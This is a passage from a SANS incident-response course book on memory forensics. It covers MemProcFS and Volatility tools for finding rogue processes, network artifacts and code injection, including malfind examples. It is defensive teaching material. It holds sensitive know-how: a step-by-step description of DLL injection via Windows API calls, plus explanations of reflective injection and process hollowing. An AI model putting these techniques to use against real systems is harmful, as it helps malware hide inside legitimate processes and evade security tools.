• Includes many features (plugins) to aid investigations

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

MemProcFS is one of the most exciting memory analysis tools to be released in a long time. It uses a unique
solution to abstract the myriad artifacts present in system RAM. Memory images (or live memory with tools
like WinPMEM or PCILeech) are mounted as a virtual file system. Folders are used to collect artifacts of
specific types and each artifact is represented as a file. Some artifacts, like a process list, are simple text files.
Others can be reconstructed executables, files extracted from handles or the VAD tree, and fragments of virtual
memory. The brilliance of this abstraction is the analyst can use whatever tools they prefer to analyze these
representations of memory locations. Simple text editors, strings, hex editors, malware analysis tools like capa
and YARA, grep or select-string for searching, are all viable tools.
The project author, Ulf Frisk, created a plugin architecture allowing parsers and capabilities to be easily added.
Frisk has been busy adding analysis plugins like findevil (anomaly and code injection detection), ntfs
(Master File Table parsing) and timeline (collecting time-based artifacts into a forensic timeline). The
output for these specific plugins are in the “M:/forensic” folder and will be covered in greater detail later.
MemProcFS is written in C and C++ making it much faster than Python-based tools like Volatility.

90

© 2023 SANS Institute

.

90

MemProcFS Usage
MemProcFS.exe –forensic 1 –device memory.img –pagefile0 pagefile.sys

MemProcFS.exe [options] –device <memory>
[Useful Options]

-v:
Enable verbose auditing in console
-pagefile0:
Specify pagefile.sys file (not required)
-pagefile1:
Specify swapfile.sys file (not required)
-mount:
Drive letter or path for analysis output (M:\ is default)
-forensic [0-4]:
Start forensic scan of memory upon startup
0 = not enabled (default value)
1 = forensic mode with in-memory sqlite database
2 = forensic mode with temp sqlite database deleted upon exit
3 = forensic mode with temp sqlite database remaining upon exit
4 = forensic mode with static named sqlite database (vmm.sqlite3)

** MemProcFS includes compiled versions for Windows and
Linux with a Python-based API. Windows is preferred for full features.
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

91

.

The setup for MemProcFS is simple. After installing the required prerequisites, all that is required is a short
command line to initiate the virtual file system mount (the project GitHub page keeps up-to-date installation
instructions, which have already been completed for you in your course VM).[1] MemProcFS performs dynamic
symbol table lookups from Microsoft servers to identify the memory image profile – for best results, use with a
system with Internet connectivity. The “-device” argument provides the path to the memory image. Optionally,
you can also provide paths to pagefile.sys and swapfile.sys files captured from the target system with the “pagefile[0|1]” parameters (a good best practice if possible). The MemProcFS support for pagefiles, and the
ability to decompress the compressed memory sections common in Windows 10 and 11 systems, can be
extremely valuable. Among the many reasons to use this software, these two features are especially impressive,
and are likely responsible for initial testing indicating this tool regularly extracts more information from memory
than its peers.
In Windows, the mount point will default to the drive letter, “M”. This can be changed with the “-mount”
option, and this option is required when using the tool on Linux systems to provide the mount path. As this is
the default, we will use “M:\” in future examples. A final option on this slide is “-forensic”. This parameter
will immediately trigger the slower plugins used to generate forensic data like findevil, ntfs, and
timeline. However, slow is an unfair description as these plugins often finish before you realize they have
started! Once the MemProcFS.exe command is executed, keep the command terminal open and move to the file
system to see your results under the mount point.
[1] MemProcFS GitHub: https://for508.com/hmkfw

© 2023 SANS Institute

.

91

MemProcFS: Identify Rogue Processes

View processes by:
•
•
•
•

PID: M:\pid
Name: M:\name
Process Tree: M:\sys\proc\proc.txt
CSV: M:\forensic\csv\process.csv

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Once initiated, progressing through the various memory forensic artifacts is as easy as traversing a file system.
As an example, if you wish to review processes you can do so through at least three mechanisms. On this slide
we show “M:\sys\proc\proc.txt” providing a typical tree view of the parent/child process relationships. This
output format should look familiar to you as it replicates that seen in windows.pstree output from the Volatility
framework. MemProcFS output provides additional information, including the account owner of the process
(User column) and a Flag column. The following flags provide a wealth of information for each process:
•
•
•
•
•

32: Process is 32-bit on 64-bit Windows.
E: Process is NOT found in EPROCESS list (memory corruption, drift or unlink)
T: Process is terminated
U: Process is user-account (non-system user)
*: Process is outside standard paths.

You will often notice multiple output files in MemProcFS folders of interest. On this slide you should also see
the file “proc-v.txt”. This file is similar to the traditional tree view, but also adds verbose full-path and
command-line information, with the downside of being a bit harder to follow the relationship tree. Tree view is
also not the only way to interact with process blocks with this tool. Analysts can also drill into processes by
name or process identifier (PID). We will see an example of this coming up.

92

© 2023 SANS Institute

.

92

MemProcFS: Analyze Process Objects
Executable Name + PID

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

93

.

Unlike Volatility, which requires separate plugins to interrogate process objects, MemProcFS brings all
available data together into a series of sub-folders. In this example we have opened the “M:\name\sesvc.exe3496” folder after identifying a process of interest with name “sesvc.exe” and PID “3496.” We might start by
opening the text file, “win-cmdline.txt” to see the full process command line stored in the process PEB. The
“token” folder will have a series of text files allowing analysis of under what account context the process was
run. The “handles” folder houses a list of the process handles for review. Similarly, the “modules” folder
provides information on loaded DLLs and the image binary (.exe file). As you drill deeper into these folders
you will not only see a wealth of metadata for each object, but very often a representation of the object itself.
As an example, for each DLL sub-folder under “modules”, a file named “pefile.dll” will be present, attempting
to piece together the original DLL from available memory. If it is something interesting to you, it could easily
be open with a hex editor, disassembler, or submitted to your favorite sandbox for analysis. Some of the other
components will be introduced later in the course, including “findevil” for anomaly and injection detection and
the “files” and “memmap” folders for file extraction.

© 2023 SANS Institute

.

93

MemProcFS: Review Network Artifacts

View network artifacts:
• Text: M:\sys\net\netstat.txt
• CSV: M:\forensic\csv\net.csv

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Discovering memory-based network artifacts is straightforward with MemProcFS. Under the “M:\sys\net”
folder will be two files: “netstat.txt” provides a traditional view of network activity and “netstat-v.txt” adds full
path information for processes. Text files lend themselves to easy review in an editor and to easy searching.
Imagine using a command-line tool like grep to quickly search this output for known-bad IP addresses or
process names.

94

© 2023 SANS Institute

.

94

Network Artifacts Review

• When available, network artifacts can provide
interesting clues to the legitimacy of a process
• When reviewing network data, you should focus on:
• Suspicious ports
• Suspicious connections
• Known bad IP addresses
• Suspicious network behavior from processes
• Interesting creation times of network objects

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

95

.

Checking network connections has long been a staple of incident response, and its usefulness does not fade
when we execute a memory-centric approach. Similar to the malware paradox of wanting to hide but needing to
run, we can add the need to communicate. What use is a compromised system if you can’t communicate with it?
Searching connections and open sockets can help us identify malicious connections, even if they occurred long
before we acquired memory. If we do find a suspicious connection, we can immediately tie it to a specific
process at a specific time because network objects are owned by processes. Further, creation times allow us to
start performing timeline analysis, tying in other artifacts.
Network artifacts are some of the easiest data points to interpret and use to find evil activity on a system. When
reviewing network artifacts, you should be looking for:
•
•
•
•
•

Suspicious ports
Suspicious connections
Known bad IP addresses
Suspicious network behavior from processes
Interesting creation times of network objects

© 2023 SANS Institute

.

95

Lab 3.2
Memory Process Objects
Average Time: 35 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

96

© 2023 SANS Institute

.

96

Memory Forensics in Incident Response and Threat Hunting Agenda

Why Memory Forensics?
Acquiring Memory
Introduction to Memory Analysis
Code Injection, Rootkits, and Extraction
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

97

.

This page intentionally left blank.

© 2023 SANS Institute

.

97

Finding the First "Hit"

1

• Identify rogue processes

2

• Analyze process objects

3

• Review network artifacts

4
5
6

• Look for evidence of code injection
• Audit drivers and rootkit detection
• Dump suspicious processes and
drivers
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

So far, we have covered the first three steps of our process. Now, it’s time to dig deeper into more advanced
artifacts like evidence of code injection, rootkit detection, and file extraction.

98

© 2023 SANS Institute

.

98

Step 4:
Look for Code Injection

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

99

.

This page intentionally left blank.

© 2023 SANS Institute

.

99

Why Code Injection?

Camouflage

Access to
Memory
and
Permissions
of Target

Process
Migration

Evade A/V
and
Application
Control

Assist with
Complex
Attacks
(i.e.,
Rootkits)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

A common question students often ask is, “If code injection is so easy to detect, why is it used so frequently?”
The simple answer is it is only easy to detect via memory analysis and it solves many problems that malware
might encounter. It is also the case that the latest variants of code injection are getting more sophisticated,
making detection harder, even via memory forensics.

.

Code injection provides excellent camouflage for malware. Instead of running a new process that could be
detected by an eagle-eyed admin or via a baseline check, malware can have an existing legitimate process run
the evil code for it.
Running inside of another process allows malicious code to inherit access to that process’s memory sections and
permissions. This is often abused by credential dumpers to inject code into the LSASS process and get access to
hashes and tickets. Emotet malware is known to inject into browser processes to gain access to stored
credentials within those browsers.
Process migration occurs when the malware wishes to change the process it is running under. This is common
during vulnerability exploitation, which can lead to code running in an undesirable process, like a browser.
Instead of taking the chance of a user closing the browser and the malware losing access, it might migrate to a
more persistent process. Metasploit and Cobalt Strike are two attack tools that encourage process migration as
common tradecraft.
The multitude of different ways code can be injected often allows it to slip by host-based security solutions.
Some code injection techniques use legitimate API function calls (LoadLibrary, CreateRemoteThread,
WriteProcessMemory) and policing every use can be difficult. Others take pains to load code surreptitiously and
take additional steps to cover any tracks. These techniques can be successful at evading application controls and
other host-based security since EXEs and DLLs are not being loaded from expected locations (like disk).
Finally, code injection can be just one stage of an attack. More advanced attacks like rootkits may also rely upon
code injection. Userland rootkits are a classic example.

100

© 2023 SANS Institute

.

100

Code Injection

• Code injection is very common with modern malware
• A built-in feature of Windows!
• VirtualAllocEx( ) and CreateRemoteThread( )
• SetWindowsHookEx( )
• Reflective injection loads code without registering with host process
• PowerShell-based reflective injection is very common

• Process hollowing is easy and stealthy
• Malware starts a suspended instance of legitimate process
• Original process code deallocated and replaced
• Can retain DLLs, handles, data, etc. from original process
• Process image EXE not backed with file on disk → process hollowing
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

101

Code injection has become a staple for modern malware. Some of the most current and famous malware around
make heavy use of code injection. It is one of the more advanced ways for malware to hide itself. Although code
injection is an excellent way to hide on a running system, it can be straightforward to identify when performing
memory analysis.

.

Two primary categories of code injection are DLL injection and process hollowing. Unfortunately, the Windows
architecture makes DLL injection relatively trivial. The only hurdle is having administrator (or debug privileges)
on the system. There are many forms of DLL injection. The attacking process can allocate space in a running
process, write the DLL file to load in the new space, and then create a new thread to load the DLL into the
running process using the Windows VirtualAllocEx() and CreateRemoteThread() function calls. Alternatively,
the attacking process can force a running process to load a malicious DLL by hooking its filter functions using
the SetWindowsHookEx() function. “Atom Bombing” uses the global atom table to write code between
processes. Metasploit has long used a technique named reflective injection, where malware creates its own
loader, bypassing many of the common API functions (which are heavily policed by security software), and
resulting in code running that is not registered with any of the host process lists.[1] PowerShell also has the
capability to perform injection (including reflective) and is increasingly seen doing so in the wild. Regardless of
the technique, all known injection techniques leave telltale signs that can be detected by memory analysis.
Process hollowing is a little bit different but can be detected by similar methods during memory analysis. In the
case of hollowing, a legitimate system process is created, but in a suspended (not running) state. The original
executable is deallocated (unmapped) and the start address is changed to point to a different location hosting
malicious code. Finally, the process is started, executing the bad code, while items like the process image name,
path, and command lines remain unchanged, serving to camouflage the now malicious process.[2] Stuxnet,
DarkComet and Kronos are famous malware families that employ process hollowing.
[1] Harmony Security Reflective DLL Injection: http://for508.com/qnl7j
[2] Analyzing Malware Hollow Processes: http://for508.com/qor98

© 2023 SANS Institute

.

101

Code Injection Detection

All injection aims to execute code in a target process
Mission: Identify extraneous code
1. Find DLLs introduced using the Windows loader (API)
• Audit loaded DLLs
• Includes DLL persistence hijacks and side-loading

2. Identify unusual executable memory locations
• Discover code not loaded via legitimate API calls
• Search memory for executable pages containing code

3. Uncover kernel and userland process inconsistencies
• Permission changes, file mapping issues, pointer modifications
• Compare hard to change (kernel) with easy to change (userland)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

The usefulness of code injection has inspired a multitude of techniques for achieving surreptitious code
execution. However, they all have something in common: getting malicious code running in a target process.
Memory analysis is well suited for auditing running code, giving us three primary ways to attack the threat:

.

Find DLLs introduced using the Windows loader (API)
The first method is to audit the standard in-memory structures to identify items that should not be present. Many
injection techniques leverage Windows API functions, and by doing so register loaded code into expected
locations like the list(s) of loaded DLLs kept by the Process Environment Block (PEB). Techniques like DLL
load order hijacking and side-loading would also fall into this category as the DLLs are ultimately loaded via
legitimate Windows capabilities. We have largely accomplished this step already in our memory analysis
process steps when looking for unusual process objects like loaded DLLs and file handles.
Identify unusual executable memory locations
Stealthier techniques like reflective injection forgo the Windows API, but ultimately still leave behind code in
tell-tale locations like memory pages marked as “executable.” In fact, this happens with every form of injection
because code must be executed from pages with executable privileges. In this step we will be looking for
executable pages and code in places where they do not belong.
Uncover kernel and userland process inconsistencies
The most advanced code injection techniques today are using similar techniques to those found in the previous
two steps but taking extra care to manipulate the memory locations to not look unusual. This includes changing
permissions after initial allocation, changing pointers to execute different code as seen in process hollowing, and
even patching previously loaded code. Luckily, memory objects are tracked in several different memory
structures and these techniques ultimately leave behind inconsistencies that can be identified by comparing
disparate information sources.
Similar to other stages in our memory forensics process, we have the opportunity to spot evil by looking at the
available data in multiple different ways. Every attack leaves something behind, and our job is to find reliable
means to detect those markers.

102

© 2023 SANS Institute

.

102

Code Injection Detection Tools
Volatility
ldrmodules
malfind
hollowfind (Vol2)
ptemalfind (Vol3)
MemProcFS
findevil
Live Analysis
Moneta
Hollows Hunter

Detect unlinked DLLs and non-memory-mapped files
Find hidden and injected code and dump affected memory sections
Identify a wide range of process hollowing artifacts
Upgraded version of malfind using page tables to detect injection

Plugin used to identify a suite of process inconsistencies

Usermode memory scanner for process injection anomalies
Usermode scanner using pe-sieve implant detection
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

103

.

This section introduces several different tools all supporting the goal of identifying code injection. The
Volatility memory analysis framework has long included plugins with this capability. The plugin ldrmodules is
used to detect unusual memory locations and unlinked DLLs, both common occurrences with more advanced
malware. Malfind is a specialized scanner looking for the telltale signs left behind by several different injection
techniques including reflective injection and hollowing. The popularity of these plugins has undoubtedly
inspired a number of techniques specifically designed to defeat them. Hence, third-party tools have been
contributed to help the project to keep pace. Hollowfind is a specialized plugin that attempts to identify many
advanced behaviors indicative of process hollowing. Hollowfind compares information stored in the process
environment block (PEB) with information that should match within the process’s virtual address descriptor
(VAD).[1] It also looks for unusual memory section permissions similar to malfind but is currently only written
for Volatility version 2. A similar plugin, threadmap, is also only present in Volatility2 and uses threads as a
primary information source, which are harder to manipulate and hide .[2] A recent port from the Rekall
framework brings the plugin ptemalfind to Volatility 3.[3] Ptemalfind uses information from kernel-based page
tables to identify the “ground truth” of executable locations and permissions. It was designed to provide more
robust identification of process hollowing techniques and defeat many possible memory forensic
countermeasures.
MemProcFS is an exceptionally feature-rich memory analysis suite and, as expected, maintains an excellent set
of capabilities for detecting code injection. This growing list of detections is maintained in the tool’s findevil
plugin, with which you will get experience.
Finally, the state of the art in code injection detection is now taking place during live analysis. Malicious
cloaking techniques are progressing to a stage making it increasingly difficult to detect them from a RAM image
alone. One example is the Gargoyle memory evasion technique that takes steps to put malware to sleep, paging
it out, and making it only detectable during brief periods of execution. Live memory analysis includes
capabilities like comparing processes in memory with the corresponding mapped files on disk and checking
digital signatures.[4] Live memory scanners like Moneta (by Forrest Orr) and Hollows Hunter (by hasherezade)
maintain some of the best capabilities for detecting these most sophisticated (and exceedingly rare) attacks.[5,6]
© 2023 SANS Institute

.

103

While we will not have time to delve into this final category of tools, we want you to be aware of them, and
know that their capabilities are increasingly being adopted into the host-based EDR products many of you use
on a daily basis.

.

[1] Detecting deceptive hollowing techniques: http://for508.com/3gyvm
[2] Threadmap: https://for508.com/pti8a
[3] Ptemalfind: https://for508.com/jbged
[4] Gargoyle memory scanning evasion technique: https://for508.com/uekxd
[5] Moneta memory scanner: https://github.com/forrest-orr/moneta
[6] Hollows Hunter: https://for508.com/7yr4o

104

© 2023 SANS Institute

.

Simple DLL Injection: Attach and Allocate

1

2

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

105

Let’s consider the process involved with one of the simplest forms of DLL injection. The attacking process first
(1) needs to attach to the victim process. In this example, the Windows API function OpenProcess() is used. In
order to attach to another process, the attacking process token must have the SeDebugPrivilege, which
Administrator accounts have by default.

.

Next, (2) our attacking process needs to allocate a small amount of memory in the victim process to write the
full path of the malicious DLL that will ultimately be loaded. The VirtualAllocEx() function is used to allocate
memory space within the victim, and WriteProcessMemory() is used to write the full path of the malicious DLL
in the newly allocated space.

© 2023 SANS Institute

.

105

Simple DLL Injection: Execute

3

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Finally, (3) code must be loaded and executed. In this example, the attacker process uses the
CreateRemoteThread() function to start a new thread in the victim process. The full path of the DLL previously
written into the process and the LoadLibraryA() function are provided as function arguments.
CreateRemoteThread() will then leverage LoadLibraryA() to retrieve the DLL from the disk, load it properly
into memory, and begin code execution within the thread.
An important concept to understand is that in order to use Windows API functions like LoadLibraryA(), the
DLL must reside on disk. There is no legitimate Windows function to load code from anywhere but disk. We
will talk about how some malware gets around this restriction later.
Amazingly, this is all there is to forcing an arbitrary victim process to run malicious code! In our example, we
used a DLL, but note that shellcode could be substituted with only a small amount of extra work. Note that
starting with Windows Vista, CreateRemoteThread only works between processes in the same Windows session
(system processes are now run in a session isolated from user processes). Modern malware like Mimikatz and
Meterpreter evade this restriction by using similar (but undocumented) API functions, NtCreateThreadEx or
RtlCreateUserThread. The rest of the injection steps remain almost identical.

106

© 2023 SANS Institute

.

106

1. Find DLLs introduced using the Windows API

• Code injected using API libraries is often present in PEB and VAD lists
• The Volatility ldrmodules plugin blends information from both
• It is normal for process executable to not be tracked in the InInit list

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

107

.

This slide provides output from a simple DLL Injection accomplished in a similar manner to the example
provided at the beginning of this section. Code was injected into the svchost.exe process (PID 1000) using the
Windows API functions CreateRemoteThread() and LoadLibraryA(). The output displayed is from a Volatility
plugin named ldrmodules. The output should look similar to another Volatility plugin previously discussed,
dlllist. The difference with this new plugin is in the extra information. The dlllist plugin only reports
information from the Process Environment Block (PEB) while ldrmodules pulls information from both the
PEB (Inload, InInit, and InMem columns tracking what code has been loaded) and the Virtual Address
Descriptor (VAD) tree (MappedPath, Base address). In this example, the extra information is overkill since the
Windows API was used to load the malicious code. The evil DLL loaded in this victim process looks similar to
legitimate DLLs loaded and does not immediately raise any flags in the output. However, there is a suspicious
DLL present. Reviewing the MappedPath column, you should notice that one of the entries was loaded from a
different location than the others. Most legitimate DLLs are loaded from the “\Windows\System32”, “\Program
Files”, or “\Windows\WinSxS” folders. Here we see a DLL loaded from a “Temp” folder, with a name that does
not normally exist in a default install of Windows, “winsrv.dll”. While it is possible it could be legitimate, it
would be an excellent place to start your investigation.
Notice the process image binary (svchost.exe in this example) has a “False” in the InInit list column, indicating
it was not present in this list. This is actually normal as this particular list in the PEB does not include the
process executable. Every (normal) process will have one entry similar to this one. In upcoming slides, we will
learn more about interpreting this output and see instances of hiding techniques that require ldrmodules to
identify. The MemProcFS project also has the capability to list loaded DLLs per process and identify anomalies
in PEB and VAD data sources via its findevil module.

© 2023 SANS Institute

.

107

.
108

© 2023 SANS Institute

.

Reflective Code Injection

• Advanced technique to perform arbitrary code
execution without explicitly calling LoadLibrary
• Uses a custom reflective loader instead of Windows loader

• Code is not registered in any way with the host
system, making it very difficult to detect
• Bonus: code can be injected directly from network/memory

• Used by many advanced adversary toolkits
• Metasploit, Cobalt Strike, PowerSploit, Empire, DoublePulsar

• Memory analysis is well suited for detection
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

109

.

Reflective code injection was developed by Stephen Fewer as a way to greatly reduce the footprint of code
injection techniques.[1] The idea was to find a way to get code running in a remote process without using the
Windows’ Loader (i.e., LoadLibrary). By excluding LoadLibrary, the code is not registered in any of the
standard in-memory lists and is thus hidden from many security and auditing tools. Additionally, the technique
evades the requirement of loading code from disk (enforced by LoadLibrary), allowing memory-only code to be
used (including code downloaded directly from the Internet), providing a much smaller footprint for security
tools to scan and identify.
There have been many different iterations and advancements of the original concept, but for our purposes, any
technique that is responsible for loading itself without the explicit use of the Windows’ loader (LoadLibrary) we
will call “reflective”.
Metasploit was one of the first tools to weaponize this concept and Cobalt Strike largely uses the same technique
as its primary means to get execution of its Beacon backdoor. The predominant PowerShell attack frameworks,
PowerSploit and Empire, have both implemented reflective injection as a primary attack vector. The powerful
DoublePulsar backdoor release made further upgrades to the reflective loader and has been identified multiple
times in the wild. Even Iran and North Korea have joined the party, with tools attributed to those nation-state
actors leveraging the technique. Luckily, memory forensics provides an excellent means to identify the telltale
signs of reflective injection, and we will have several tools coming up to facilitate analysis.
[1] Harmony Security Reflective DLL Injection: http://for508.com/qnl7j

© 2023 SANS Institute

.

109

2. Identify Unusual Executable Memory Locations

Memory section
with “Execute”
permissions

Memory section
not backed with a
file on disk

Memory section
contains code (PE
file or shellcode)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In its simplest form, code injection is used to force another process to load a new DLL. That DLL can often be
easily identified in the target process’s Process Environment Block using tools like Volatility’s dlllist or
ldrmodules. These methods are simpler for security tools to detect, so malware has been driven toward more
clever methods. However, by circumventing the standard mechanisms for processes to load code, they create
new signatures that can be detected using different techniques. This is a common theme in forensics: no matter
how hard something tries to remain invisible, there are always corresponding artifacts that can prove its
existence.
This slide shows a common three step process for detecting code injection, including many of the advanced
variants like reflective injection. This process takes advantage of additional memory structures, notably the
VAD tree tracking each memory section belonging to a process. Our tools will iterate through the VAD tree of
each process auditing each location in process memory. Each memory section is assigned a protection
(permissions) value, and a good first indicator are unusual permissions present like “Page_Execute_ReadWrite.”
This particular set of permissions is very problematic since it is dangerous to have pages where both writes can
occur, and code can execute. This set of permissions is a classic marker left behind by many different injection
techniques. The next check on the memory section of interest is whether it is mapped to a file on disk. Recall
that coming from disk is the only legitimate way code like DLLs and EXEs can be loaded in Windows. This
mapped path is stored in the process VAD tree and can be audited. A memory section should not be marked
executable if there is not code there, and the only legitimate way to load code in Windows is from disk (which
maps that code section to its original path on disk). Alas, while these checks are very good at finding many
different types of injection, they also inevitably find false positives. One common example occurs in legitimate
software using things like .NET or just-in-time compilers. Thus, a final sanity check is made to determine if
actual code is present in the memory location (typically a Portable Executable (PE) file or shellcode). This last
check helps eliminate false positives since there are inevitably memory sections that have unusual permissions,
but no dangerous code present. This might sound very complicated, but luckily our memory analysis tools do
these checks for us. The Volatility malfind plugin and MemProcFS findevil were specifically designed to
perform these checks and provide output for analyst review.

110

© 2023 SANS Institute

.

110

Detecting Code Injection: windows.malfind.Malfind

Purpose
• Scans process memory sections looking for indications of code
injection. Identified sections can be extracted for further analysis.

Important Parameters
• Directory to save extracted files (--dump)
• Show information for specific process IDs (--pid)

Investigative Notes
• Significantly outclassed by new malware, but surprisin gly effective
• Useful to understand the challenges of injection detection

• False positives occur and disassembled code is a helpful sanity check
• You might see multiple injected sections within the same process
• Dumped sections can be reverse engineered or scanned with A/V
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

111

.

The windows.malfind.Malfind plugin has long been a core plugin in the Volatility suite. Its creator,
Michael Hale Ligh of Malware Analyst’s Cookbook fame, realized injected code often leaves telltale signs
within memory—namely, memory sections marked as "executable" and not including an associated mapped file
on disk. For each process, malfind scans the assigned memory sections and subjects them to these tests. When
a hit is found, it is output to standard out and the section is written to a file if the “--dump" option is specified.
Dumped sections are stored as individual files and named according to PID and virtual address offset. Recall
that there is one further check required to weed out false positives: identified sections must contain executable
code. Malfind leaves this final check up to the analyst, which can be difficult to perform if you are unfamiliar
with portable executable headers and shellcode. For each identified memory section, the following information
is presented (columns described for Volatility 3 and are slightly different than those present in Volatility 2):
•
•
•
•
•
•
•
•

PID (Process ID)
Process (Process Name)
Start VPN (Starting Offset of Virtual Page Number)
End VPN (Ending Offset of Virtual Page Number)
Tag (Pool tag indicating type of memory section)
Protection (Memory section permissions)
CommitCharge (number of assigned/committed pages in RAM and page file)
PrivateMemory (Type of memory: 0=Mapped, 1=Private)

Malfind has an impressive success rate on traditional forms of code injection, including more advanced
techniques like reflective injection. However, it is perhaps a victim of its own success, and the latest code
injection techniques often take specific steps to modify markers in memory to evade its detections. It is still
viable as a first pass, and we will add additional detection capabilities later in this section. You will encounter
plenty of false positives in malfind output. There are sadly many unusual (but benign) pages found in
memory. One nice feature of the output is it displays the initial part of the memory section in hex and as
assembly code, making it easy to identify the telltale "MZ" header for Portable Executable files or whether the
data appears to be something else like shellcode. These sections can (and should) be dumped using the “--dump”
option, allowing them to be fully loaded into a disassembler like IDA Pro, scanned with anti-malware
signatures, or simply reviewed for interesting string content. Equivalent plugin in Volatility 2: malfind
© 2023 SANS Institute

.

111

.

(--dump-dir=<directory> is used for dumping memory sections in this version). The port of malfind to
Volatility 3 was not a 1:1 conversion and Version 3 includes better disassembly capabilities, particularly with
64-bit samples.

112

© 2023 SANS Institute

.

Detecting Code Injection: malfind (Meterpreter)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

113

Metasploit Meterpreter was an early adopter of reflective DLL injection and amazingly continues to evade a
wide range of security tools on the market. In this example, a Meterpreter remote access tool was injected into a
svchost.exe process. After the backdoor was in place, the Metasploit “run vnc” command was executed via
Meterpreter to inject a VNC remote desktop DLL on the victim and start a VNC session.

.

Malfind is well suited to find reflective DLL injection activity; it finds several potentially injected sections in
this memory image. This slide shows one such section located at memory offset 0x470000, owned by the
svchost.exe process (PID 4584). Note that this memory section has PAGE_EXECUTE_READWRITE
privileges (a known indicator for injection) and is not mapped to a file on disk (implicit here, as it is a necessary
precondition for malfind to identify a suspicious memory section). The only remaining check is whether
there is actual code located in this memory section. In this case, notice the four-byte Windows Portable
Executable (PE) signature 4d 5a 90 00 (or MZ signature) at the start of the memory section. This is a strong
indicator that an executable has been loaded through non-standard methods into a memory section with
abnormal (and dangerous) permissions. Thus, it fulfills all three of the checks for malicious injection, and we
can mark this process as injected. Also, note we gave the malfind command the “--dump-dir" parameter, so in
the output folder we should see an extracted copy of each memory section identified. Our next step might be to
perform further analysis on this section, such as running it through antivirus, or reverse engineering.
At the bottom of the slide, we see an additional command filtering malfind output. Here we are filtering the
output to only show hits with the telltale “MZ” signature used by the Windows portable executable format in
EXE and DLL files (an even more specific filter would be 4d 5a 90 00). The “-B1” parameter instructs grep to
show one line before any hit (in this case, also showing the line that includes the process name). The result of
this compound command is a quick list of memory sections with have a high likelihood of code injection due to
the presence of code—an MZ header—in a memory section with suspicious permissions, and not mapped to
disk. The results of this command show a second process with a very peculiar name (Metasploit randomizes
names to make it more difficult to create predictable detection signatures). This process turns out to be related to
the VNC session that Meterpreter started on the victim and is further proof we would want to look deeper into
this likely compromised system.

© 2023 SANS Institute

.

113

.
114

© 2023 SANS Institute

.

Detecting Code Injection: x86 Function Prologue

Well-known x86
assembly code prologue
present in an injected
memory section
(note lack of MZ header)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

115

.

In this malfind example, we see an identified section in the services.exe process PID 656 with
PAGE_EXECUTE_READWRITE privileges that is not mapped to a file on disk (mapping information is not
displayed, but not being mapped is a necessary precondition to be identified by malfind). 64 bytes of the page
contents is provided for analyst review. In this example, the contents appear to be legitimate code because the
section contains the common PUSH EBP; MOV EBP, ESP function prologue denoting the setup of a function in
32-bit assembly language. The presence of real code in the memory section confirms the process was likely
injected and is an excellent example of code injection not utilizing the portable executable format (for example,
no MZ header). This example was found on a system infected by the Poison Ivy RAT.

© 2023 SANS Institute

.

115

Detecting Code Injection: x64 Function Prologue

x64
function
prologue
variant
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Spotting patterns is a critical threat hunting skill. While you might not be a reverse engineer who can read
assembly code, with a little study and practice you can usually identify enough to make decisions based on data
available. Remember the goal with Volatility malfind output: you simply need to decide whether the data in
the unusual memory section looks like code. Code typically contains many functions, or small sections of code
which perform a subtask. Each time a function is used, the stack and registers must be set up in such a way that
when the function completes, the execution state can return to where it was before the function was called. This
set of instructions is called an assembly function prologue and creates very regular patterns within assembly
code. Some analysts might be more familiar with the x86 function prologue (PUSH EBP; MOV EBP, ESP) due
to its time in service. The x64 prologue is different, due to different register names and slightly different
architecture. As an example, rbp is the new name for ebp and rsp the new name for esp. The assembly
instructions updating this regular set of registers is one reliable pattern you can look for. Perhaps an easier
pattern to remember is the strange ASCII representation of the prologue, USVWATAUAVAWH, in this
example. Once you learn about this pattern you will likely start seeing it everywhere in (x64) hex output.
Hexacorn, a popular reverse engineering blog, posted a fun analysis of it including many very similar patterns
(the registers can be pushed in a different order making slight variations in the ASCII pattern).[1] If you see this
pattern, you are very likely looking at the start of a x64 function, which is code, and in the case of malfind
output, this satisfies our final check to be able to label this process as injected.
[1] UVWATAUAVAWH – Meet The Pushy String | Hexacorn: https://for508.com/8cqho

116

© 2023 SANS Institute

.

116

Detecting Code Injection: malfind (False Positive)

Assembly does not
appear to represent
real code—potential
false positive
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

117

.

Here we see a section identified by malfind in the OneDrive.exe process with
PAGE_EXECUTE_READWRITE privileges that is not mapped to a file on disk (unseen here, but a necessary
precondition observed by malfind). A short snippet of the contents of the section is provided for analyst
review. Notice the disassembly looks very repetitive, with the same instruction being repeated over and over.
This is because the large number of hex "00 00" bytes at the beginning of the memory section are being
interpreted as “add [rax], al". The assembly opcode for this instruction is "00 00", and the disassembler is just
trying to interpret what is present in the memory section. In this case, this looks like garbage and is unlikely to
be real code. Hence, this memory section fails one of the three checks for injection (code is not present in the
section) and does not show evidence of injection. Keep in mind we are only seeing 64 bytes of a much larger
memory section. There could still be code at a later location, and a full review of the memory pages would be
required to fully rule this out as not being malicious.

© 2023 SANS Institute

.

117

Innovations in Code Injection

• New forms of injection are designed to defeat detection
• Header modification, clearing, and mirroring
• Permission modifications to eliminate suspicious RWX
• Process Environment Block modifications and masquerading
• Module overwriting, hollowing, and patching

